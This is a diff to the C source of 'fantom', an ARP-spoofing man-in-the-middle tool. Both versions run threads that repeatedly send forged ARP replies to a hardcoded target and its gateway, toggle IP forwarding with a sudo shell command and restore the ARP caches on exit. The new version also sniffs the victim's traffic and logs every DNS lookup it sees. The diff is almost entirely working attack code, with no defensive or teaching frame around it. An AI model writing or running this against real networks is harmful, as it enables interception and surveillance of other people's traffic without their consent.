@@ -1,142 +1,109 @@
-#include "network_structs.h"
-#include "arp_utils.h"
+#include "fantom.h"
 #include <pthread.h>
 #include <signal.h>
 
-char* local_ip_str = (char*)"????";
-char* target_ip_str = (char*)"????";
-char* gateway_ip_str = (char*)"????";
-char* network_interface = (char*)"????";
+/* IPv4 Addresses and Interface Name */
+char* target_ip = (char*)"192.168.0.10";
+char* gateway_ip = (char*)"192.168.0.1";
+char* interface = (char*)"wlp3s0";
 
-unsigned char target_mac[6];
-unsigned char gateway_mac[6];
+/* Hardware Addresses */
+macaddr target_mac;
+macaddr gateway_mac;
 
-int sock;
-int poisoning_socket;
-int sniffer_socket;
-LOCAL_DATA localData;
+/* Local Data structure */
+LOCAL_NET_DATA lnd;
 
-void show_usage()
-{
-    printf("\n***Usage: fantom [interface] [target ip] [gateway ip]\n\n");
-}
-
-int parse_arguments(int argc, char** argv, int socket)
-{
-    if (argc != 4)
-    {
-        show_usage();
-        return 0;
-    }
-
-    network_interface = argv[1];
-    target_ip_str     = argv[2];
-    gateway_ip_str    = argv[3];
-
-    getLocalProtocolAddress(socket, network_interface, &local_ip_str);
-    return 1;
-}
-
-void cleanup(int sig)
-{
-    printf("\n[*] Re-Arping Targets . . . \n");
-    uint32_t target_ip = charToUintIp(target_ip_str);
-    uint32_t gateway_ip = charToUintIp(gateway_ip_str);
-
-    // restoring target arp
-    for (int i = 0; i < 16; i++)
-    {
-        send_arp_packet(poisoning_socket, localData.interface_index, gateway_mac, target_mac, gateway_ip, target_ip);
-    }
-
-    // restoring gateway arp
-    for (int i = 0; i < 16; i++)
-    {
-        send_arp_packet(poisoning_socket, localData.interface_index, target_mac, gateway_mac, target_ip, gateway_ip);
-    }
-
-    close(sock);
-    close(poisoning_socket);
-    close(sniffer_socket);
-    printf("[*] Stopping Service [*]\n\n");
-    exit(0);
-}
+/* Sockets */
+int arp_socket;
+int sniffing_socket;
 
 void* poison_target(void* param)
 {
-    uint32_t target_ip = charToUintIp(target_ip_str);
-    uint32_t spoofed_gateway_ip = charToUintIp(gateway_ip_str);
-
-    printf("[*] ARP poisoning target with IPv4: ");
-    PrintIpAddress(target_ip);
+    printf("[*] ARP poisoning target with IPv4: %s\n", target_ip);
 
     while (1)
     {
         sleep(1);
-        send_arp_packet(poisoning_socket, localData.interface_index, localData.mac_address, target_mac, spoofed_gateway_ip, target_ip);
+        struct arp_packet pkt;
+        craft_arp_packet(&pkt, strtoip(gateway_ip), lnd.mac_address, strtoip(target_ip), target_mac);
+        send_arp_packet(arp_socket, lnd.interface_index, pkt);
     }
     return 0;
 }
 
 void* poison_gateway(void* param)
 {
-    uint32_t gateway_ip = charToUintIp(gateway_ip_str);
-    uint32_t spoofed_target_ip = charToUintIp(target_ip_str);
-
-    printf("[*] ARP poisoning gateway with IPv4: ");
-    PrintIpAddress(gateway_ip);
-    printf("\n");
+    printf("[*] ARP poisoning target with IPv4: %s\n", gateway_ip);
 
     while (1)
     {
         sleep(1);
-        send_arp_packet(poisoning_socket, localData.interface_index, localData.mac_address, gateway_mac, spoofed_target_ip, gateway_ip);
+        struct arp_packet pkt;
+        craft_arp_packet(&pkt, strtoip(target_ip), lnd.mac_address, strtoip(gateway_ip), gateway_mac);
+        send_arp_packet(arp_socket, lnd.interface_index, pkt);
     }
     return 0;
 }
 
-int main(int argc, char** argv)
+void cleanup(int sig)
 {
-    sock = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
-    if (sock == -1) {
-        printf("Error opening raw socket\n");
-        return -1;
-    }
+    printf("\n[*] Re-Arping Targets . . . \n");
 
-    if (parse_arguments(argc, argv, sock) == 0)
+    for (int i = 0; i < 20; i++)
     {
-        return -1;
+        struct arp_packet pkt;
+        craft_arp_packet(&pkt, strtoip(gateway_ip), gateway_mac, strtoip(target_ip), target_mac); // restoring target
+        send_arp_packet(arp_socket, lnd.interface_index, pkt);
     }
 
-    // enable ip forwarding
-    system("sudo echo 1 > /proc/sys/net/ipv4/ip_forward");
-    printf("[+] Preparing ARP Socket [+]\n");
+    for (int i = 0; i < 20; i++)
+    {
+        struct arp_packet pkt;
+        craft_arp_packet(&pkt, strtoip(target_ip), target_mac, strtoip(gateway_ip), gateway_mac); // restoring gateway
+        send_arp_packet(arp_socket, lnd.interface_index, pkt);
+    }
 
+    close(arp_socket);
+    close(sniffing_socket);
+    printf("[*] Stopping Service [*]\n\n");
+    exit(0);
+}
+
+uint8_t* EditPacket(uint8_t* pkt)
+{
+    if (has_dns_layer(pkt))
+    {
+        struct dns_layer dnsl = get_dns_layer(pkt);
+        if (dnsl.qdcount == 1)
+            printf("%s requested for %s\n", iptostr(get_ip_layer(pkt).src_addr), dnsl.qd.qname);
+    }
+
+    return pkt;
+}
+
+int main()
+{
+    arp_socket = create_arp_udp_socket();
+    if (arp_socket == -1) return -1;
+
+    // disabling ip forwarding (just in case it's on)
+    system("sudo echo 0 > /proc/sys/net/ipv4/ip_forward");
     signal(SIGINT, cleanup);
 
-    struct ether_arp arpPacket;
-    localData = get_local_data("wlan0", sock);
-    struct in_addr ip_address_struct = { 0 };
+    lnd = get_local_net_data(interface, arp_socket);
     printf("\n======= Getting Local Data =======\n");
-    printf("Interface       :  %s\n", localData.interface_name);
-    printf("Interface Index :  %d\n", localData.interface_index);
-    printf("MAC Address     :  "); PrintMacAddress(localData.mac_address);
-    printf("IP address      :  %s\n", local_ip_str);
-    printf("\n\n");
+    printf("Interface       :  %s\n", lnd.interface_name);
+    printf("Interface Index :  %d\n", lnd.interface_index);
+    printf("MAC Address     :  "); print_mac_addr(lnd.mac_address); printf("\n");
+    printf("IP address      :  %s\n\n", iptostr(lnd.ip_address));
+    printf("[*] Sending out ARP requests . . . [*]\n");
 
-    // Getting target mac address
-    get_mac_address(sock, localData, &arpPacket, charToUintIp(local_ip_str), charToUintIp(target_ip_str));
-    memcpy(target_mac, arpPacket.arp_sha, sizeof(target_mac));
-    printf("Target MAC   :  "); PrintMacAddress(target_mac);
+    send_arp_request(arp_socket, lnd, strtoip(target_ip), &target_mac);
+    printf("Target MAC   :  "); print_mac_addr(target_mac); printf("\n");
 
-    // Getting gateway mac address
-    get_mac_address(sock, localData, &arpPacket, charToUintIp(local_ip_str), charToUintIp(gateway_ip_str));
-    memcpy(gateway_mac, arpPacket.arp_sha, sizeof(gateway_mac));
-    printf("Gateway MAC  :  "); PrintMacAddress(gateway_mac);
-    printf("\n");
-
-    close(sock);
-    poisoning_socket = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
+    send_arp_request(arp_socket, lnd, strtoip(gateway_ip), &gateway_mac);
+    printf("Gateway MAC  :  "); print_mac_addr(gateway_mac); printf("\n\n");
 
     // Start arp poisoning target and gateway
     pthread_t target_thread, gateway_thread;
@@ -144,27 +111,11 @@ int main(int argc, char** argv)
     printf("\n");
     pthread_create(&gateway_thread, NULL, poison_gateway, NULL);
 
-    // prepare the packet sniffer
-    sniffer_socket = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
-    if (sniffer_socket < 0) {
-        printf("Could not create raw ip socket for packet sniffing . . .\n");
-        return -1;
-    }
+    sniffing_socket = create_sniffing_socket();
+    register_packet_edit_callback(EditPacket);
 
-    uint8_t buffer[1540];
-    while (1)
-    {
-        /*
-        // recieve packets from the target
-        int bytes = recv(sniffer_socket, buffer, sizeof(buffer), 0);
-        if (bytes < 0)
-        {
-            printf("[-] Error occured when sniffing packets [-]\n");
-            break;
-        }
-        if (bytes == 0) continue;
+    start_sniffing_loop(sniffing_socket, lnd, target_mac, gateway_mac);
 
-        printf("[*] Recieved bytes: %d [*]\n", bytes);
-        */
-    }
+    return 0;
 }
+
